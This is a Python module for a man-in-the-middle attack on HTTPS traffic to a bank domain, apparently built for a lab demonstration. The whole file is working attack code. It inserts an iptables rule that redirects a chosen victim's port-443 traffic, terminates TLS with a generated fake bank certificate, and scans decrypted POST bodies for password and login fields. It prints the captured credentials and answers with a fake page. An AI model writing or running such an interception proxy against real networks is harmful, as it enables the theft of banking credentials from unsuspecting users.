"""
Simplified SSL Stripping for MITM attacks.

This module implements a basic HTTPS proxy that uses a fake certificate to
intercept and decrypt TLS traffic for a specific domain (e.g., bank.com)
in a controlled lab environment. It captures and logs POST request data
that may contain credentials.

Key components:
- HTTPS proxy with a dynamically generated fake certificate.
- Decrypts TLS traffic to inspect plaintext requests.
- Logs potential credentials from POST requests.
- Redirects victim's HTTPS traffic using iptables.
"""
# mypy: ignore-errors
from __future__ import annotations

import socket
import ssl
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any
import click

from cert_gen import generate_bank_cert
from network_utils import get_interface_info


class SSLStripHTTPSHandler(BaseHTTPRequestHandler):
    """Handles HTTPS connections - traffic is already decrypted by SSL layer."""

    stripper: 'SSLStripper' = None  # type: ignore

    def log_message(self, msg_format: str, *args: Any) -> None:
        """Custom logging - suppress verbose HTTP server logs."""
        if self.stripper and not self.stripper.silent:
            click.echo(f"[HTTPS] {args[0] if args else msg_format}")

    def _get_host(self) -> str:
        """Get Host header from request."""
        return self.headers.get('Host', 'bank.com')

    def _log_post_data(self) -> None:
        """Log potential credentials from POST requests."""
        content_length = self.headers.get('Content-Length')
        if not content_length:
            return

        try:
            body = self.rfile.read(int(content_length))
            if not body:
                return

            body_str = body.decode(errors='ignore').lower()
            cred_keywords = ['password', 'passwd', 'pass', 'pwd', 'secret', 'login', 'username', 'email']

            if any(kw in body_str for kw in cred_keywords):
                click.echo(click.style("\n" + "=" * 60, fg="red", bold=True))
                click.echo(click.style("  CREDENTIALS CAPTURED OVER HTTPS!", fg="red", bold=True))
                click.echo(click.style("=" * 60, fg="red", bold=True))
                click.echo(f"  From: {self.client_address[0]} | Host: {self._get_host()} | Path: {self.path}")
                click.echo(click.style("-" * 60, fg="red"))

                for pair in body.decode(errors='ignore').split('&'):
                    if '=' in pair:
                        key, value = pair.split('=', 1)
                        click.echo(f"  {key}: {value}")
                
                click.echo(click.style("=" * 60, fg="red", bold=True) + "\n")

            # Restore body for further processing
            self.rfile = self._restore_body(body)

        except (ValueError, OSError) as e:
            click.echo(f"Error logging POST data: {e}")

    def _restore_body(self, body: bytes):
        """Helper to restore body after reading."""
        import io
        return io.BytesIO(body)

    def _handle_request(self, method: str) -> None:
        """Generic handler for all decrypted HTTPS requests."""
        if not self.stripper.silent:
            click.echo(f"[HTTPS] {method} {self._get_host()}{self.path} from {self.client_address[0]}")
        
        if method == 'POST':
            self._log_post_data()

        # For the demo, return a fake response instead of forwarding.
        response_body = b"""
        <html><head><title>Bank Login</title></head>
        <body><h1>Credentials Captured!</h1>
        <p>This is a fake response from the attacker. Your HTTPS traffic was decrypted.</p>
        </body></html>
        """

        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', str(len(response_body)))
        self.end_headers()
        self.wfile.write(response_body)

    def do_GET(self) -> None:
        """Handle GET request."""
        self._handle_request('GET')

    def do_POST(self) -> None:
        """Handle POST request (credentials likely here)."""
        self._handle_request('POST')

    def do_HEAD(self) -> None:
        self._handle_request('HEAD')

    def do_PUT(self) -> None:
        self._handle_request('PUT')

    def do_DELETE(self) -> None:
        self._handle_request('DELETE')


class SSLStripper:
    """
    Manages the SSL stripping proxy and network traffic redirection.

    This class sets up an HTTPS proxy with a fake certificate to intercept
    and decrypt TLS traffic. It uses iptables to redirect the victim's
    HTTPS traffic to the local proxy port.
    """

    def __init__(
        self,
        iface: str,
        victim_ip: str,
        gateway_ip: str,
        https_port: int = 443,
        silent: bool = False,
    ):
        self.iface = iface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.https_port = https_port
        self.silent = silent
        _, self.attacker_ip = get_interface_info(iface)
        self.cert_path, self.key_path = generate_bank_cert(".")
        self._running = False
        self._thread: threading.Thread | None = None
        self._server: HTTPServer | None = None
        self._iptables_rules_added = False

    def _setup_iptables(self) -> None:
        """Redirect HTTPS traffic from victim to the local proxy port."""
        try:
            cmd = [
                "iptables", "-t", "nat", "-I", "PREROUTING", "1",
                "-s", self.victim_ip, "-p", "tcp", "--dport", "443",
                "-j", "REDIRECT", "--to-port", str(self.https_port)
            ]
            subprocess.run(cmd, check=True, capture_output=True)
            self._iptables_rules_added = True
            click.echo(click.style(
                f"iptables: Redirecting HTTPS from {self.victim_ip}:443 -> :{self.https_port}",
                fg="yellow"
            ))
        except (subprocess.CalledProcessError, FileNotFoundError) as e:
            click.echo(click.style(f"Warning: iptables setup failed: {e}", fg="red"))

    def _cleanup_iptables(self) -> None:
        """Remove the iptables redirection rule."""
        if not self._iptables_rules_added:
            return
        try:
            cmd = [
                "iptables", "-t", "nat", "-D", "PREROUTING",
                "-s", self.victim_ip, "-p", "tcp", "--dport", "443",
                "-j", "REDIRECT", "--to-port", str(self.https_port)
            ]
            subprocess.run(cmd, check=True, capture_output=True)
            click.echo(click.style("iptables: Restored HTTPS routing", fg="yellow"))
        except (subprocess.CalledProcessError, FileNotFoundError):
            click.echo(click.style("Warning: Failed to remove iptables rule", fg="yellow"))
        finally:
            self._iptables_rules_added = False

    def _create_ssl_context(self) -> ssl.SSLContext:
        """Create SSL context with our fake certificate."""
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(
            certfile=self.cert_path,
            keyfile=self.key_path
        )
        return context

    def _run_https_proxy(self) -> None:
        """Run the HTTPS proxy server with the fake certificate."""
        SSLStripHTTPSHandler.stripper = self
        try:
            server_address = ('0.0.0.0', self.https_port)
            self._server = HTTPServer(server_address, SSLStripHTTPSHandler)

            ssl_context = self._create_ssl_context()
            self._server.socket = ssl_context.wrap_socket(self._server.socket, server_side=True)
            self._server.socket.settimeout(1.0)

            click.echo(click.style(
                f"SSL proxy listening on port {self.https_port} with fake cert",
                fg="yellow"
            ))

            while self._running:
                try:
                    self._server.handle_request()
                except socket.timeout:
                    continue

        except OSError as e:
            if self._running:
                click.echo(click.style(f"HTTPS proxy error: {e}", fg="red"))
        finally:
            if self._server:
                self._server.server_close()
                self._server = None

    def start(self) -> None:
        """Start the SSL stripper in a background thread."""
        if self._running:
            click.echo("SSL stripper is already running.")
            return

        self._setup_iptables()
        self._running = True
        self._thread = threading.Thread(target=self._run_https_proxy, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        """Stop the SSL stripper and clean up resources."""
        if not self._running:
            return

        click.echo(click.style("\nStopping SSL Stripper...", fg="yellow"))
        self._running = False

        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=2.0)

        self._cleanup_iptables()

    def join(self, timeout: float | None = None) -> None:
        """Wait for the thread to finish."""
        if self._thread:
            self._thread.join(timeout)

    def is_running(self) -> bool:
        """Check if the proxy is running."""
        return self._running and self._thread and self._thread.is_alive()
